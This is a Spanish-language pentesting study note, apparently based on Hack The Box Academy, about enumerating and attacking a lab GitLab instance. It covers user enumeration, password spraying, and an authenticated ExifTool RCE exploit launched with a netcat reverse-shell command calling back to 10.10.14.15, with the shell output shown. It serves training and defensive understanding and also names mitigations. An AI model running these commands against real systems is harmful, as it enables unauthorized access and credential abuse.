---
tags:
  - Enumeración
---

## Enumeración

Si podemos obtener credenciales de usuario de nuestro OSINT, es posible que podamos iniciar sesión en una instancia de GitLab. La autenticación de dos factores está deshabilitada de forma predeterminada.

![Página de restricciones de inicio de sesión de GitLab con opciones para autenticación de contraseña, autenticación de dos factores, notificaciones por correo electrónico para inicios de sesión desconocidos y configuraciones para URL de página de inicio y ruta de inicio de sesión.](https://academy.hackthebox.com/storage/modules/113/gitlab_2fa.png)

---

Podemos determinar rápidamente que GitLab está en uso en un entorno simplemente navegando a la URL de GitLab, y se nos dirigirá a la página de inicio de sesión, que muestra el logotipo de GitLab.

![Página de inicio de sesión de GitLab con campos para nombre de usuario o correo electrónico y contraseña, y un botón de inicio de sesión.](https://academy.hackthebox.com/storage/modules/113/gitlab_login.png)

#### Versión
Para ver la versión nos tenemos que registrar e ir a /help

---

No hay mucho que podamos hacer contra GitLab sin saber el número de versión o haber iniciado sesión. Lo primero que debemos intentar es navegar `/explore` y ver si hay algún proyecto público que pueda contener algo interesante.

Los proyectos públicos pueden ser interesantes porque podemos usarlos para obtener más información sobre la infraestructura de la empresa, encontrar código de producción en el que podamos encontrar un error después de una revisión de código, credenciales codificadas, un script o archivo de configuración que contenga credenciales u otros secretos como una clave privada SSH o una clave API.

![GitLab Explore la página que muestra proyectos, grupos y fragmentos con un proyecto de Administrador titulado 'Inlanefreight dev'.](https://academy.hackthebox.com/storage/modules/113/gitlab_explore.png)

Navegando al proyecto, parece un proyecto de ejemplo y puede no contener nada útil, aunque siempre vale la pena explorar.

![Descripción general del proyecto GitLab para 'Inlanefreight dev' que muestra 44 commits, 1 rama y una lista de archivos con los últimos mensajes de confirmación.](https://academy.hackthebox.com/storage/modules/113/gitlab_example.png)


Desde aquí, podemos explorar cada una de las páginas enlazadas en la parte superior izquierda `groups`, `snippets`, y `help`. También podemos usar la funcionalidad de búsqueda y ver si podemos descubrir otros proyectos. Una vez que hayamos terminado de investigar lo que está disponible externamente, debemos verificar y ver si podemos registrar una cuenta y acceder a proyectos adicionales. Supongamos que la organización no configuró GitLab solo para permitir que los correos electrónicos de la empresa se registren o para requerir que un administrador apruebe una nueva cuenta. En ese caso, es posible que podamos acceder a datos adicionales.

![Página de registro de GitLab con campos para nombre, apellido, nombre de usuario, correo electrónico y contraseña, junto con una descripción de GitLab como una plataforma completa de DevOps.](https://academy.hackthebox.com/storage/modules/113/gitlab_signup.png)


También podemos usar el formulario de registro para enumerar usuarios válidos (más sobre esto en la siguiente sección). Si podemos hacer una lista de usuarios válidos, podríamos intentar adivinar contraseñas débiles o posiblemente reutilizar las credenciales que encontramos de un volcado de contraseña utilizando una herramienta como `Dehashed` como se ve en la sección osTicket. Aquí podemos ver al usuario `root` se toma. Veremos otro ejemplo de enumeración de nombre de usuario en la siguiente sección. En este caso particular de GitLab (y probablemente otros), también podemos enumerar correos electrónicos. Si intentamos registrarnos con un correo electrónico que ya se ha tomado, obtendremos el error `1 error prohibited this user from being saved: Email has already been taken`. A partir del momento de escribir, esta técnica de enumeración de nombre de usuario funciona con la última versión de GitLab. Incluso si el `Sign-up enabled` la casilla de verificación se borra en la página de configuración en `Sign-up restrictions`, todavía podemos navegar hacia el `/users/sign_up`página y enumerar usuarios pero no podrá registrar un usuario.

Se pueden implementar algunas mitigaciones para esto, como hacer cumplir 2FA en todas las cuentas de usuario, utilizando `Fail2Ban` para bloquear los intentos fallidos de inicio de sesión que son indicativos de ataques de fuerza bruta, e incluso restringir qué direcciones IP pueden acceder a una instancia de GitLab si debe ser accesible fuera de la red corporativa interna.

![Página de registro de GitLab con campos para nombre, apellido, nombre de usuario, correo electrónico y contraseña. Mensaje de error: 'El nombre de usuario ya está tomado' para 'root'.](https://academy.hackthebox.com/storage/modules/113/gitlab_taken2.png)


Sigamos adelante y regístrese con las credenciales `hacker:Welcome` y entra y mira alrededor. Tan pronto como completamos el registro, iniciamos sesión y nos llevamos a la página del panel de proyectos. Si vamos al `/explore` página ahora, notamos que ahora hay un proyecto interno `Inlanefreight website` disponible para nosotros. Excavando un poco, esto parece ser un sitio web estático para la empresa. Supongamos que se trataba de algún otro tipo de aplicación (como PHP). En ese caso, podríamos descargar la fuente y revisarla en busca de vulnerabilidades u funcionalidad oculta o encontrar credenciales u otros datos confidenciales.

![Descripción general del proyecto GitLab para 'Inlanefreight website' con 22 commits, 1 sucursal y una lista de archivos. Advertencia: 'Agregar tecla SSH' para tirar o empujar a través de SSH.](https://academy.hackthebox.com/storage/modules/113/gitlab_internal.png)

En un escenario del mundo real, es posible que podamos encontrar una cantidad considerable de datos confidenciales si podemos registrarnos y obtener acceso a cualquiera de sus repositorios. Como esto [entrada de blog](https://tillsongalloway.com/finding-sensitive-information-on-github/index.html) explica, hay una cantidad considerable de datos que podemos descubrir en GitLab, GitHub, etc.




## Ataque

### Nombre de usuario Enumeración

Podemos escribir uno nosotros mismos en Bash o Python o usar [este](https://www.exploit-db.com/exploits/49821) para enumerar una lista de usuarios válidos. 
Se puede encontrar la versión Python3 de esta misma herramienta [aquí](https://github.com/dpgg101/GitLabUserEnum). Al igual que con cualquier tipo de ataque de pulverización de contraseñas, debemos tener en cuenta el bloqueo de la cuenta y otros tipos de interrupciones. 

Los valores predeterminados de GitLab se establecen en 10 intentos fallidos que resultan en un desbloqueo automático después de 10 minutos. Esto se puede ver [aquí](https://gitlab.com/gitlab-org/gitlab-ce/blob/master/config/initializers/8_devise.rb).

Al descargar el script y ejecutarlo contra la instancia de GitLab de destino, vemos que hay dos nombres de usuario válidos `root` (la cuenta de administrador incorporada) y `bob`. Si eliminamos con éxito una gran lista de usuarios, podríamos intentar un ataque controlado de pulverización de contraseñas con contraseñas débiles y comunes, como `Welcome1` o `Password123`, etc., o intente reutilizar las credenciales recopiladas de otras fuentes, como los volcados de contraseñas de violaciones de datos públicos.

https://github.com/dpgg101/GitLabUserEnum

```shell-session
vcrdcr@htb[/htb]$ ./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  			             GitLab User Enumeration Script
   	    			             Version 1.0

Description: It prints out the usernames that exist in your victim's GitLab CE instance

Disclaimer: Do not run this script against GitLab.com! Also keep in mind that this PoC is meant only
for educational purpose and ethical use. Running it against systems that you do not own or have the
right permission is totally on your own risk.

Author: @4DoniiS [https://github.com/4D0niiS]
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


LOOP
200
[+] The username root exists!
LOOP
302
LOOP
302
LOOP
200
[+] The username bob exists!
LOOP
302
```

---

### Ejecución Remota Autenticada de Código

GitLab Community Edition versión 13.10.2 e inferior sufría de una ejecución remota de código autenticada [vulnerabilidad](https://hackerone.com/reports/1154542) debido a un problema con ExifTool que maneja metadatos en archivos de imagen cargados. 
GitLab solucionó este problema con bastante rapidez, pero es probable que algunas empresas sigan utilizando una versión vulnerable. Podemos usar esto [explotar](https://www.exploit-db.com/exploits/49951) para lograr RCE.

Como se trata de la ejecución remota de código autenticada, primero necesitamos un nombre de usuario y una contraseña válidos. En algunos casos, esto solo funcionaría si pudiéramos obtener credenciales válidas a través de OSINT o un ataque de adivinación de credenciales. Sin embargo, si nos encontramos con una versión vulnerable de GitLab que permite el auto-registro, podemos registrarnos rápidamente para una cuenta y llevar a cabo el ataque.

```shell-session
vcrdcr@htb[/htb]$ python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '

[1] Authenticating
Successfully Authenticated
[2] Creating Payload 
[3] Creating Snippet and Uploading
[+] RCE Triggered !!
```

Y obtenemos un caparazón casi al instante.

```shell-session
vcrdcr@htb[/htb]$ nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.88] 60054

git@app04:~/gitlab-workhorse$ id

id
uid=996(git) gid=997(git) groups=997(git)

git@app04:~/gitlab-workhorse$ ls

ls
VERSION
config.toml
flag_gitlab.txt
sockets
```